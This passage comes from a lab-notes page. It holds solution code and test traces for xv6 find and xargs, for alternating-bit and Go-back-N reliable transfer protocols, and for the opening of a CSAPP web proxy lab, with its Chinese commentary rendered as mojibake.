            }
            memmove(p, de.name, DIRSIZ);
            p[DIRSIZ] = 0;
            if(stat(buf, &amp;st) &lt; 0){
                printf(&quot;find: cannot stat %s\n&quot;, buf);
                continue;
            }
            char *itemname = fmtname(buf);
//            if (!strcmp(name, itemname)) {  // compare
            if (match(name, trim(itemname))) {
                printf(&quot;%s\n&quot;, buf);
            } else {
                if (st.type == T_DIR) {
                    if (strcmp(curDir, itemname) &amp;&amp; strcmp(parDir, itemname)){
                        find(buf, name);
                    }
                }
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc &lt; 3) {
        fprintf(2, &quot;Usage: find\n&quot;);
        exit(1);
    }
    while (argv[1][strlen(argv[1])-1] == '/') {
        argv[1][strlen(argv[1])-1] = 0;
    }

    strcpy(curDir, fmtname(&quot;.&quot;));
    strcpy(parDir, fmtname(&quot;..&quot;));

    for (int i = 2; i &lt; argc; i++) {
//        char nameBuf[DIRSIZ];
//        strcpy(nameBuf, fmtname(argv[i]));
        find(argv[1], argv[i]);
    }
    exit(0);
}


int matchhere(char*, char*);
int matchstar(int, char*, char*);

int
match(char *re, char *text)
{
    if(re[0] == '^')
        return matchhere(re+1, text);
    do{  // must look at empty string
        if(matchhere(re, text))
            return 1;
    }while(*text++ != '\0');
    return 0;
}

// matchhere: search for re at beginning of text
int matchhere(char *re, char *text)
{
    if(re[0] == '\0')
        return 1;
    if(re[1] == '*')
        return matchstar(re[0], re+2, text);
    if(re[0] == '$' &amp;&amp; re[1] == '\0')
        return *text == '\0';
    if(*text!='\0' &amp;&amp; (re[0]=='.' || re[0]==*text))
        return matchhere(re+1, text+1);
    return 0;
}

// matchstar: search for c*re at beginning of text
int matchstar(int c, char *re, char *text)
{
    do{  // a * matches zero or more instances
        if(matchhere(re, text))
            return 1;
    }while(*text!='\0' &amp;&amp; (*text++==c || c=='.'));
    return 0;
}
</code></pre>
<h2 id="lab6-xargs"><a class="header" href="#lab6-xargs">Lab6 xargs</a></h2>
<p>æ²¡æœ‰æŒ‰ç…§å®éªŒçš„è¦æ±‚ä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ç›´è‡³'\n'ï¼Œè€Œæ˜¯æ‰¹é‡è¯»å–ï¼Œä¹‹åæ¥åˆ†å‰²ï¼Œæ‰€ä»¥ä»£ç æœ‰äº›å¤æ‚ã€‚åœ¨è¿ç”¨æŒ‡é’ˆæ•°ç»„çš„æ—¶å€™æ³¨æ„ã€‚</p>
<pre><code class="language-c">#include &quot;kernel/types.h&quot;
#include &quot;kernel/stat.h&quot;
#include &quot;kernel/param.h&quot;
#include &quot;user/user.h&quot;

int main(int argc, char* argv[]) {
    if (argc &lt; 2) {
        fprintf(2, &quot;Usage: %s cmd args...\n&quot;, argv[0]);
        exit(1);
    }

    char *execargv[MAXARG];
    for (int i = 1; i &lt; argc; ++i) {
        execargv[i-1] = argv[i];
    }

    char buf[1024];
    int n, m;

    m = 0;
    while ((n = read(0, buf+m, sizeof(buf)-m-1)) &gt; 0) {
        char *bp = buf + m, *p;
        p = bp;
        while (p &lt; buf + m + n) {
            if (*p == '\n') {
                *p = '\0';
            }
            p++;
        }
        m += n;
        buf[m] = '\0';

        p = bp;
        while (p &lt; bp + n) {
            if (strlen(p) == 0) {
                p++;
                continue;
            }

            if (fork() == 0) {
                // child
//                strcpy(execargv[argc], p);  // WRONG!! copy the args from stdin
                execargv[argc-1] = p;  // æ³¨æ„æœªåˆ†é…å†…å­˜ï¼Œåªä¿å­˜æ ˆæŒ‡é’ˆ
                execargv[argc] = 0;
                exec(execargv[0], execargv);
                fprintf(2, &quot;exec %s failed\n&quot;, execargv[0]);
                exit(1);
            } else {
                wait(0);
            }
            p += (strlen(p) + 1);
        }
    }
    exit(0);
}
</code></pre>
<p>END</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="computer-networking---å¯é æ•°æ®ä¼ è¾“åè®®"><a class="header" href="#computer-networking---å¯é æ•°æ®ä¼ è¾“åè®®">Computer Networking - å¯é æ•°æ®ä¼ è¾“åè®®</a></h1>
<p>ã€Šè®¡ç®—æœºç½‘ç»œ è‡ªé¡¶å‘ä¸‹æ–¹æ³•ã€‹é…å¥—å®éªŒ</p>
<p>å®ç°ä¸€ä¸ªå¯é æ•°æ®ä¼ è¾“åè®®ï¼ˆreliable data transfer protocol)ï¼Œå®éªŒ<a href="https://media.pearsoncmg.com/aw/aw_kurose_network_3/labs/lab5/lab5.html">é“¾æ¥</a></p>
<h2 id="ä¸€æ¯”ç‰¹äº¤æ¢åè®®"><a class="header" href="#ä¸€æ¯”ç‰¹äº¤æ¢åè®®">ä¸€ã€æ¯”ç‰¹äº¤æ¢åè®®</a></h2>
<p>åŸºäºåœæ­¢ç­‰å¾…çš„ç†è®ºï¼Œä½¿ç”¨æ ¡éªŒå’Œã€åºå·ã€è‚¯å®šå¦å®šACKã€é‡ä¼ å’Œå®šæ—¶å™¨çš„æŠ€æœ¯ï¼Œå®ç°ä¸€ä¸ªåœ¨ä¸å¯é ç½‘ç»œä¸Šçš„å•é¡¹æ•°æ®ä¼ è¾“çš„å¯é åè®®ã€‚</p>
<p>åœæ­¢ç­‰å¾…ï¼šå‘é€æ–¹åœ¨å‘é€äº†ä¸€ä¸ªæ•°æ®åŒ…ï¼ˆåˆ†ç»„ï¼‰åç­‰å¾…æ¥æ”¶æ–¹çš„å›åº”ï¼Œåœ¨æ­¤æœŸé—´ä¸å‘é€ä»»ä½•æ•°æ®ã€‚</p>
<p>åºå·ï¼šä¸ºäº†ä½¿æ¥æ”¶æ–¹çŸ¥é“å‘é€æ–¹æ˜¯å¦åœ¨é‡ä¼ å‰ä¸€ä¸ªå‘é€åˆ†ç»„ï¼ˆæ¥æ”¶åˆ°çš„åˆ†ç»„åºå·ä¸æœ€è¿‘æ”¶åˆ°çš„åˆ†ç»„åºå·ç›¸åŒï¼‰ï¼Œåœ¨åœæ­¢ç­‰å¾…åè®®ä¸­ï¼Œä½¿ç”¨1æ¯”ç‰¹çš„åºå·å³å¯ã€‚</p>
<p>å¦å®šACKï¼šå¯¹ä¸Šæ¬¡æ­£ç¡®æ¥æ”¶çš„åˆ†ç»„å‘é€ä¸€ä¸ªACKï¼ˆå†—ä½™ACKï¼‰ï¼Œå³å¯å®ç°å¦å®šACKã€‚</p>
<p>å®šæ—¶å™¨ï¼šå¦‚æœå½“å‰å‘é€å®Œåˆ†ç»„ååœ¨ä¸€å®šæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°å¯¹åº”çš„ACKï¼Œé‚£ä¹ˆè¿›è¡Œé‡ä¼ ã€‚</p>
<h3 id="å®éªŒæ¡†æ¶"><a class="header" href="#å®éªŒæ¡†æ¶">å®éªŒæ¡†æ¶</a></h3>
<p>å®éªŒç½‘ç»œç¯å¢ƒä¸ºæ¨¡æ‹Ÿç¯å¢ƒï¼Œåˆ†ä¸º3éƒ¨åˆ†ã€‚layer5ä»£è¡¨åº”ç”¨å±‚ï¼Œlayer4æ˜¯æˆ‘ä»¬è¦å®ç°çš„å¯é æ•°æ®ä¼ è¾“å±‚ï¼Œlayer3æ˜¯ä¸å¯é çš„ä¼ è¾“åª’ä»‹ã€‚å®éªŒä¸­å®ç°çš„æ˜¯å•å‘çš„æ•°æ®ä¼ è¾“ï¼ˆAå‘é€ï¼ŒBæ¥æ”¶ï¼‰</p>
<p>å‚è€ƒè¯¾æœ¬ä¸Šå›¾3-15 çš„å‘é€æ–¹çŠ¶æ€è½¬ç§»å›¾å’Œ 3-14çš„æ¥æ”¶æ–¹çŠ¶æ€è½¬ç§»å›¾ã€‚</p>
<p>åº”ç”¨å±‚ä¼šè°ƒç”¨A_outout(msg)å‘Bå‘é€æ•°æ®ï¼ŒAéœ€è¦æ„å»ºå‘é€åˆ†ç»„ï¼Œå¼€å¯å®šæ—¶å™¨ã€‚</p>
<p>A_inputï¼ˆpktï¼‰å‡½æ•°ç”¨äºä»layer3ä¸­æ¥æ”¶Bå‘æ¥çš„ACKä¿¡æ¯ï¼Œè¿›è¡Œå¤„ç†ï¼Œåˆ¤æ–­ACKçš„ç±»å‹å’Œæ•°æ®åŒ…æ˜¯å¦å—æŸã€‚</p>
<p>A_timerinterrupt() å‡½æ•°ç”¨äºå¤„ç†å½“å‰å‘é€çš„åˆ†ç»„è¶…æ—¶åçš„é‡ä¼ ã€‚</p>
<p>B_inputï¼ˆpktï¼‰å‡½æ•°ä»layer3ä¸­æ¥æ”¶Aå‘é€çš„æ•°æ®ï¼Œè¿›è¡Œå¤„ç†ï¼ˆå‘é€ç»™æ•°æ®æ¥æ”¶çš„åº”ç”¨å±‚layer5ï¼‰å¹¶è¿›è¡Œå›å¤ã€‚</p>
<p>æ¥æ”¶æ–¹å’Œå‘é€æ–¹çš„çŠ¶æ€è®°å½•ç»“æ„ä»¥åŠç›¸åº”åˆå§‹åŒ–ï¼š</p>
<pre><code class="language-c">const int WCALL = 0, WACK = 1;
typedef struct astate{
    int state;  // å½“å‰å¤„äºç­‰å¾…è°ƒç”¨ æˆ– ç­‰å¾…ackçš„çŠ¶æ€
    int curseq;
    int checksum;
    char data[20];
}AState;

const int WZERO = 0, WONE = 1;
typedef struct bstate{
    int state;
}BState;

AState A_State;
BState B_State;

void A_init()
{
    A_State.checksum = 0;
    A_State.state = WCALL;
    A_State.curseq = 0;
}
void B_init()
{
    B_State.state = WZERO;
}
</code></pre>
<p>A_output</p>
<pre><code class="language-c">float timer_increment = 50;

int compute_pkt_sum(struct pkt packet) {
    int sum = 0;
    for (int i = 0; i &lt; 20; i++ ) {
        sum += packet.payload[i];
    }
    sum += packet.acknum;
    sum += packet.seqnum;
    return sum;
}

/* called from layer 5, passed the data to be sent to other side */
void A_output(message)
  struct msg message;
{
    if (A_State.state == WCALL) {
        struct pkt pkt_to_send = {.acknum = A_State.curseq,
                .seqnum = A_State.curseq};
        for (int i = 0; i &lt; 20; i++) {
            char d = message.data[i];
            pkt_to_send.payload[i] = d;
            A_State.data[i] = d;
        }
        pkt_to_send.checksum = compute_pkt_sum(pkt_to_send);

        A_State.state = WACK;

        starttimer(A, timer_increment);

        tolayer3(A, pkt_to_send);

        if (TRACE &gt; 2) {
            printf(&quot;A: Being called.\n&quot;);
        }
    } else {
        ADropped_msg++;
        if (TRACE &gt; 2) {
            printf(&quot;A: Drop Message.\n&quot;);
        }
    }
}
</code></pre>
<p>A_input</p>
<pre><code class="language-c">/* called from layer 3, when a packet arrives for layer 4 */
void A_input(packet)
  struct pkt packet;
{
    if (A_State.state == WACK) {
        if (packet.acknum == A_State.curseq &amp;&amp; packet.checksum == compute_pkt_sum(packet)) {
            if (TRACE &gt; 2) {
                printf(&quot;A: valid ACK.\n&quot;);
            }
            stoptimer(A);

            A_State.curseq = !A_State.curseq;
            A_State.checksum = 0;
            A_State.state = WCALL;

            ACKed_msg++;

        } else {
            printf(&quot;A: Invalid checksum or pktACK %d != curseq %d\n&quot;, packet.acknum, A_State.curseq);
        }
    } else {
        if (TRACE &gt; 2) {
            printf(&quot;A: Invalid ACK.\n&quot;);
        }
    }
}
</code></pre>
<p>B_input</p>
<pre><code class="language-c">void B_input(packet)
  struct pkt packet;
{
    struct pkt response;
    for (int i = 0; i &lt; 20; ++i) {
        response.payload[i] = 0;
    }

    if (packet.seqnum == B_State.state &amp;&amp; packet.checksum == compute_pkt_sum(packet)) {
        if (TRACE &gt; 2) {
            printf(&quot;B: Receive valid data. ACK%d\n&quot;, B_State.state);
        }
        tolayer5(B, packet.payload);

        response.acknum = B_State.state;
        response.seqnum = B_State.state;
        response.checksum = compute_pkt_sum(response);

        tolayer3(B, response);

        B_State.state = !B_State.state;
    } else {
        if (TRACE &gt; 2) {
            printf(&quot;B: Resend ACK%d.\n&quot;, !B_State.state);
        }

        BACK_resend++;

        // å†—ä½™ack
        response.acknum = !B_State.state;
        response.seqnum = !B_State.state;
        response.checksum = compute_pkt_sum(response);
        tolayer3(B, response);
    }
}
</code></pre>
<p>A_timerinterrupt</p>
<pre><code class="language-c">void A_timerinterrupt()
{
    if (TRACE &gt; 2) {
        printf(&quot;A: time out, resend packet.\n&quot;);
    }

    AResend_msg++;

    // resend packet
    struct pkt packet = {.acknum = A_State.curseq, .checksum = A_State.checksum, .seqnum = A_State.curseq};
    for (int i = 0; i &lt; 20; i++) {
        packet.payload[i] = A_State.data[i];
    }
    tolayer3(A, packet);
    starttimer(A, timer_increment);
}
</code></pre>
<h3 id="æµ‹è¯•"><a class="header" href="#æµ‹è¯•">æµ‹è¯•</a></h3>
<p>ä½¿ç”¨çš„è¶…æ—¶é—´éš”æ˜¯50ï¼Œåº”ç”¨å‘æ¥æ•°æ®åŒ…çš„é—´éš”æ˜¯100ã€‚åŸç¨‹åºä¸­æˆ‘è¿˜å¢åŠ äº†ä¸€äº›è®°å½•ç”¨çš„å˜é‡ï¼Œç»Ÿè®¡ä¸¢åŒ…ç‡ä¹‹ç±»çš„ã€‚æ²¡æœ‰ä¸¢åŒ…å—æŸçš„æƒ…å†µä¸‹ï¼Œä¸€æ¬¡æ”¶å‘åœ¨TRACE=3çš„debugè¾“å‡ºä¸ºï¼š</p>
<pre><code class="language-sh">EVENT time: 69.657104,  type: 1, fromlayer5  entity: 0
          GENERATE NEXT ARRIVAL: creating new arrival
            INSERTEVENT: time is 69.657104
            INSERTEVENT: future time will be 196.618607
          MAINLOOP: data given to student: aaaaaaaaaaaaaaaaaaaa
          START TIMER: starting timer at 69.657104
            INSERTEVENT: time is 69.657104
            INSERTEVENT: future time will be 119.657104
          TOLAYER3: seq: 0, ack 0, check: 1940 aaaaaaaaaaaaaaaaaaaa
          TOLAYER3: scheduling arrival on other side
            INSERTEVENT: time is 69.657104
            INSERTEVENT: future time will be 75.066002
A: Being called.

EVENT time: 75.066002,  type: 2, fromlayer3  entity: 1
B: Receive valid data. ACK0
          TOLAYER5: data received: aaaaaaaaaaaaaaaaaaaa
          TOLAYER3: seq: 0, ack 0, check: 0 
          TOLAYER3: scheduling arrival on other side
            INSERTEVENT: time is 75.066002
            INSERTEVENT: future time will be 79.824150

EVENT time: 79.824150,  type: 2, fromlayer3  entity: 0
A: valid ACK.
          STOP TIMER: stopping timer at 79.824150
</code></pre>
<p>ä¸¢åŒ…é‡ä¼ çš„æƒ…å†µï¼š</p>
<pre><code class="language-sh">EVENT time: 286.424072,  type: 1, fromlayer5  entity: 0
          GENERATE NEXT ARRIVAL: creating new arrival
            INSERTEVENT: time is 286.424072
            INSERTEVENT: future time will be 289.861755
          MAINLOOP: data given to student: cccccccccccccccccccc
          START TIMER: starting timer at 286.424072
            INSERTEVENT: time is 286.424072
            INSERTEVENT: future time will be 336.424072
          TOLAYER3: seq: 0, ack 0, check: 1980 cccccccccccccccccccc
          TOLAYER3: scheduling arrival on other side
            INSERTEVENT: time is 286.424072
            INSERTEVENT: future time will be 293.377441
A: Being called.

EVENT time: 289.861755,  type: 1, fromlayer5  entity: 0
          GENERATE NEXT ARRIVAL: creating new arrival
            INSERTEVENT: time is 289.861755
            INSERTEVENT: future time will be 483.757172
          MAINLOOP: data given to student: dddddddddddddddddddd
A: Drop Message.

EVENT time: 293.377441,  type: 2, fromlayer3  entity: 1
B: Receive valid data. ACK0
          TOLAYER5: data received: cccccccccccccccccccc
          TOLAYER3: packet being lost

EVENT time: 336.424072,  type: 0, timerinterrupt   entity: 0
A: time out, resend packet.
          TOLAYER3: seq: 0, ack 0, check: 0 cccccccccccccccccccc
          TOLAYER3: scheduling arrival on other side
            INSERTEVENT: time is 336.424072
            INSERTEVENT: future time will be 343.941284
          START TIMER: starting timer at 336.424072
            INSERTEVENT: time is 336.424072
            INSERTEVENT: future time will be 386.424072

EVENT time: 343.941284,  type: 2, fromlayer3  entity: 1
B: Resend ACK0.
          TOLAYER3: seq: 0, ack 0, check: 0 
          TOLAYER3: scheduling arrival on other side
            INSERTEVENT: time is 343.941284
            INSERTEVENT: future time will be 350.816040

EVENT time: 350.816040,  type: 2, fromlayer3  entity: 0
A: valid ACK.
          STOP TIMER: stopping timer at 350.816040
</code></pre>
<h2 id="äºŒgo-back-n"><a class="header" href="#äºŒgo-back-n">äºŒã€Go-back-N</a></h2>
<p>ç”»äº†æ¥æ”¶æ–¹å’Œå‘é€æ–¹çš„æœ‰é™çŠ¶æ€æœºã€‚</p>
<p><img src="./images/blog20210805/GBN-receiver.png" alt="" /></p>
<p><img src="./images/blog20210805/sender.png" alt="" /></p>
<h3 id="å®ç°"><a class="header" href="#å®ç°">å®ç°</a></h3>
<p>ç›¸æ¯”æ¯”ç‰¹äº¤æ¢åè®®ï¼Œæ¥æ”¶æ–¹çš„å¢åŠ äº†å¯¹æ”¶åˆ°msgçš„ç¼“å­˜ï¼Œè¿™è¾¹æˆ‘ä½¿ç”¨äº†ä¸€ä¸ªå¾ªç¯æ•°ç»„æ¥å®ç°ç¼“å­˜ï¼Œbaseã€nextseqnumã€tailæŒ‡é’ˆå°†ç¼“å­˜åˆ†ä¸ºäº†å››ä¸ªéƒ¨åˆ†ï¼šå·²å‘é€ä¸”æ”¶åˆ°ç¡®è®¤çš„msg <code>[0, base)</code>ï¼Œå·²å‘é€ä½†æœªæ”¶åˆ°ç¡®è®¤çš„msg <code>[base, nextseqnum)</code>ï¼Œçª—å£ä¸­ç­‰å¾…å‘é€çš„msg <code>[nextseqnum, min(tail, base+WINDOW) )</code>, ç¼“å­˜çš„msg <code>[baseï¼Œtail]</code>ã€‚</p>
<pre><code class="language-c">#define MAXBUFFER 50
#define WINDOW 8


typedef struct astate{
    int base;
    int nextseqnum;
    char buffer[MAXBUFFER][20];
    int tail;
    int buf_size;
}AState;

int insert_tail(AState* astate, char* data) {
    if (astate-&gt;buf_size == MAXBUFFER) {
        return 0;
    }
    for (int i = 0; i &lt; 20; ++i) {
        astate-&gt;buffer[astate-&gt;tail][i] = data[i];
    }
    astate-&gt;tail = (astate-&gt;tail + 1) % MAXBUFFER;
    astate-&gt;buf_size++;
    return 1;
}

typedef struct bstate{
    int expectedseqnum;
}BState;
</code></pre>
<p>å…·ä½“å®ç°æ—¶æ³¨æ„ç¼“å­˜æ˜¯å¾ªç¯ä½¿ç”¨çš„ï¼Œä½¿ç”¨buf_sizeè®°å½•å·²ç»ç¼“å­˜çš„æ•°æ®é‡ï¼Œå®Œæ•´ä»£ç <a href="https://gitee.com/sugarcoder/ComputerNetworkingLab.git">é“¾æ¥</a></p>
<h3 id="æµ‹è¯•-1"><a class="header" href="#æµ‹è¯•-1">æµ‹è¯•</a></h3>
<p>è®¾ç½®çš„è¶…æ—¶ä¸º100ï¼Œæ¶ˆæ¯é—´éš”ä¸º50ï¼Œä¸¢åŒ…ç‡ä¸º0.1ï¼Œå—æŸç‡ä¸º0.1ï¼Œæ€»å…±å‘é€10ä¸ªæ¶ˆæ¯ï¼ŒTRACE=2ã€‚</p>
<p>æ­£å¸¸æ”¶å‘</p>
<pre><code class="language-txt">EVENT time: 34.828552,  type: 1, fromlayer5  entity: 0
A: Got Message ,window [0, 0)

EVENT time: 40.237450,  type: 2, fromlayer3  entity: 1
B: ACK 0

EVENT time: 44.995598,  type: 2, fromlayer3  entity: 0
A: Receive valid ACK, window updated:[1, 1)
EVENT time: 98.309303,  type: 1, fromlayer5  entity: 0
A: Got Message ,window [1, 1)

EVENT time: 107.837433,  type: 2, fromlayer3  entity: 1
B: ACK 1

EVENT time: 117.540672,  type: 2, fromlayer3  entity: 0
A: Receive valid ACK, window updated:[2, 2)
</code></pre>
<p>ä¸¢åŒ…</p>
<pre><code class="language-txt">A: Got Message ,window [2, 2)

EVENT time: 153.000458,  type: 2, fromlayer3  entity: 1
B: ACK 2
          TOLAYER3: packet being lost

EVENT time: 238.246262,  type: 1, fromlayer5  entity: 0
A: Got Message ,window [2, 3)

EVENT time: 243.212036,  type: 0, timerinterrupt   entity: 0
A: time out. Go back N.[2, 4)
A: Resend seq 2
          TOLAYER3: packet being lost
A: Resend seq 3

EVENT time: 244.415878,  type: 2, fromlayer3  entity: 1
B: ACK 3

EVENT time: 251.290649,  type: 2, fromlayer3  entity: 0
A: Receive valid ACK, window updated:[4, 4)
</code></pre>
<p>é‡ä¼ </p>
<pre><code class="language-txt">A: time out. Go back N.[4, 6)
A: Resend seq 4
A: Resend seq 5

EVENT time: 426.913330,  type: 2, fromlayer3  entity: 1
B: ACK 5
          TOLAYER3: packet being corrupted

EVENT time: 430.196320,  type: 2, fromlayer3  entity: 1
B: resend ACK 4

EVENT time: 432.601593,  type: 2, fromlayer3  entity: 1
B: resend ACK 5
          TOLAYER3: packet being lost

EVENT time: 433.927460,  type: 2, fromlayer3  entity: 0
A: Invalid packet data.

EVENT time: 441.234406,  type: 2, fromlayer3  entity: 0
Warning: attempt to start a timer that is already started
A: Receive valid ACK, window updated:[5, 6)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---proxy-lab"><a class="header" href="#csapp---proxy-lab">CSAPP - Proxy Lab</a></h1>
<h2 id="part-1-implementing-a-sequential-web-proxy"><a class="header" href="#part-1-implementing-a-sequential-web-proxy">Part 1Â Implementing a sequential web proxy</a></h2>
<p><strong>è®¾è®¡</strong>:proxyçš„ä»»åŠ¡æ˜¯æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå°†è¯·æ±‚é¢„å¤„ç†ï¼ˆuriè§£æã€hostè§£æï¼‰åå‘é€ç»™çœŸæ­£çš„æœåŠ¡å™¨</p>
<p><strong>æ„å»ºProxy</strong></p>
<p>mainå‡½æ•°è´Ÿè´£åˆ›å»ºä¸å®¢æˆ·ç«¯è¿æ¥çš„socketï¼Œç­‰å¾…è¿æ¥è¯·æ±‚</p>
<pre><code class="language-c">int main(int argc, char* argv[])
{
    int listenfd, connfd;
    char hostname[MAXLINE], port[MAXLINE];
    socklen_t clientlen;
    struct sockaddr_storage clientaddr;

    if (argc != 2) {
        fprintf(stderr, &quot;usage: %s \n&quot;, argv[0]);
        exit(1);
    }

    listenfd = Open_listenfd(argv[1]);
    while (1) {
        clientlen = sizeof(clientaddr);
        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);

        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE,
                    port, MAXLINE, 0);
        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);

        proxying(connfd);
        Close(connfd);
    }
}
</code></pre>
<p>proxyingå‡½æ•°æ˜¯æ•´ä¸ªä»£ç†æµç¨‹çš„æŠ½è±¡ï¼Œè¯»å–å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œåˆ›å»ºä¸æœåŠ¡å™¨çš„è¿æ¥socketï¼ˆproxyfdï¼‰ï¼Œè½¬å‘responseã€‚</p>
<pre><code class="language-c">void proxying(int fd) {
    char buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];
    char hostname[MAXLINE], port[MAXLINE], query[MAXLINE];
    rio_t rio;

    Rio_readinitb(&amp;rio, fd);
    if (!Rio_readlineb(&amp;rio, buf, MAXLINE)) // read request line
        return;
    printf(&quot;Request line:%s&quot;, buf);

    char host[MAXLINE];  // request header host
    read_requesthdrs(&amp;rio, host);  // read request header

    sscanf(buf, &quot;%s %s %s&quot;, method, uri, version);
    parseuri(uri, hostname, port, query);
    if (strlen(host) == 0) {
        strcpy(host, hostname);
    }

    // open connection to server
    int proxyfd = Open_clientfd(hostname, port);

    // send request to server
    send_requesthdrs(proxyfd, method, query, host);

    // Read response from server
    forward_response(proxyfd, fd);

    Close(proxyfd);
}
</code></pre>
<p>å…¶ä»–å¸®åŠ©å‡½æ•°</p>
<pre><code class="language-c">int parseuri(char* uri, char* hostname, char* port, char* query) {
    char *result = uri;
    char delim = '/';
    result = index(uri, delim);
    result += 2;  // skip '//'
    char *start = result;
    result = index(result, delim);

    if (!result) { // ä¸è§„èŒƒçš„uriï¼Œå¦‚ http://localhost:8080
        strcpy(hostname, uri);
        strcpy(query, &amp;delim);
    } else {
        strncpy(hostname, start, result - start);
        hostname[result - start] = '\0';
        strcpy(query, result);
    }

    start = index(hostname, ':');
    if (start) {
        hostname[start - hostname] = '\0';
        start++; // skip ':'
        strcpy(port, start);
    } else {
        strcpy(port, &quot;80&quot;);
    }
    Dprintf(&quot;hostname=%s, port=%s, query=%s\n&quot;, hostname, port, query);
    return 1;
}

void read_requesthdrs(rio_t *rp, char* host)
{
    char buf[MAXLINE];

    Rio_readlineb(rp, buf, MAXLINE);
    printf(&quot;%s&quot;, buf);
    while(strcmp(buf, &quot;\r\n&quot;)) {          //line:netp:readhdrs:checkterm
        Rio_readlineb(rp, buf, MAXLINE);
        printf(&quot;%s&quot;, buf);
        char* p = index(buf, ':');
        if (strncmp(&quot;Host&quot;, buf, p-buf) == 0) {
            strcpy(host, p+1);
        }
    }
    return;
}

void send_requesthdrs(int clientfd, char* method, char* query, char* host) {
    char buf[MAXLINE];

    sprintf(buf, &quot;%s %s HTTP/1.0\r\n&quot;, method, query);
    // send request to server
    sprintf(buf, &quot;%sHost: %s\r\n&quot;, buf, host);
    strcat(buf, user_agent_hdr);
    strcat(buf, &quot;Connection: close\r\n&quot;);
    strcat(buf, &quot;Proxy-Connection: close\r\n\r\n&quot;);
    Rio_writen(clientfd, buf, strlen(buf));

    Dprintf(&quot;%s&quot;, buf);
}

// read from proxyfd and forward to clientfd
void forward_response(int proxyfd, int clientfd) {
    rio_t rio;
    int n;
    char buf[MAXLINE];
    char response_header[MAXLINE];
    int flag = 1;

    Rio_readinitb(&amp;rio, proxyfd);
    while ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != 0) {
        Rio_writen(clientfd, buf, n);
        // for debug print
        if (flag &amp;&amp; strcmp(buf, &quot;\r\n&quot;) == 0) {
            Fputs(&quot;Response header:\n&quot;, stdout);
            Fputs(response_header, stdout);
            flag = 0;
        } else if (flag == 1) {
            strcat(response_header, buf);
        }
    }
}
</code></pre>
<p>ä½¿ç”¨curlæµ‹è¯•ä»£ç†æœåŠ¡å™¨</p>
<pre><code class="language-shell">$ curl -v --proxy http://localhost:34240 http://localhost:34241/godzilla.jpg --output god.jpg
</code></pre>
<p>å¯¹äºä¸‹è½½æ–‡ä»¶çš„æµ‹è¯•ï¼Œä½¿ç”¨curlçš„--output <file> é€‰é¡¹ï¼Œä¸‹è½½åˆ°æŒ‡å®šçš„fileæ–‡ä»¶ã€‚</p>
<h2 id="part-2-å¤šçº¿ç¨‹ä»£ç†æœåŠ¡å™¨"><a class="header" href="#part-2-å¤šçº¿ç¨‹ä»£ç†æœåŠ¡å™¨">Part 2 å¤šçº¿ç¨‹ä»£ç†æœåŠ¡å™¨</a></h2>
<p>æ¯”è¾ƒç®€å•ï¼ŒæŠŠproxyingå‡½æ•°æ”¾åˆ°çº¿ç¨‹ä¸­æ‰§è¡Œå°±è¡Œäº†ã€‚è®°å¾—è®¾ç½®ä¸ºåˆ†ç¦»å¼çº¿ç¨‹ã€‚</p>
<pre><code class="language-c">int main(int argc, char* argv[])
{
    // omit

    listenfd = Open_listenfd(argv[1]);
    while (1) {
        clientlen = sizeof(clientaddr);
        connfdp = Malloc(sizeof(int));
        *connfdp = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);

        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE,
                    port, MAXLINE, 0);
        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);

        Pthread_create(&amp;tid, NULL, thread, connfdp);
    }
}

void *thread(void *vargp) {
    int connfd = *((int *)vargp);
    Pthread_detach(Pthread_self());
    Free(vargp);

    proxying(connfd);
    Close(connfd);

    return NULL;
}
</code></pre>
<h2 id="part-3-ç¼“å­˜å®ç°"><a class="header" href="#part-3-ç¼“å­˜å®ç°">Part 3 ç¼“å­˜å®ç°</a></h2>
<p>é‡åˆ°é—®é¢˜ï¼šç®€å•åœ°å®ç°åï¼Œå‘ç°ç¬¬ä¸€æ¬¡é€šè¿‡ä»£ç†æœåŠ¡å™¨ä¸‹è½½çš„å›¾ç‰‡å¯ä»¥æ‰“å¼€ï¼Œå†æ¬¡å‘ä»£ç†æœåŠ¡å™¨è¯·æ±‚å›¾ç‰‡ï¼Œç”¨curlè·å–ç¼“å­˜çš„å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°ï¼Œç»“æœæ˜¾ç¤ºæ ¼å¼æŸåï¼Œæ— æ³•æ‰“å¼€ã€‚</p>
<p>è§£å†³ï¼šåŸæ¥æ˜¯æˆ‘åœ¨æ¥å—response bodyçš„æ—¶å€™ï¼Œç”¨çš„æ˜¯strcpyï¼ŒstrcpyåŠŸèƒ½æ˜¯å°†ä¸€ä¸ªä»¥nullç»“å°¾çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°å¦ä¸€ä¸ªä»¥nullç»“å°¾çš„å­—ç¬¦ä¸²æœ«å°¾ï¼Œç”±äºå›¾ç‰‡æ•°æ®ä¸­å¯èƒ½å­˜åœ¨å…¨0å­—èŠ‚ï¼Œæ‰€ä»¥å¯¼è‡´å¤åˆ¶çš„æ•°æ®ç¼ºå¤±ã€‚æ­£ç¡®åšæ³•æ˜¯ä½¿ç”¨memcpyï¼ŒæŒ‡å®šè¦å¤åˆ¶çš„å­—èŠ‚æ•°ã€‚</p>
<p><strong>Cacheå®ç°</strong></p>
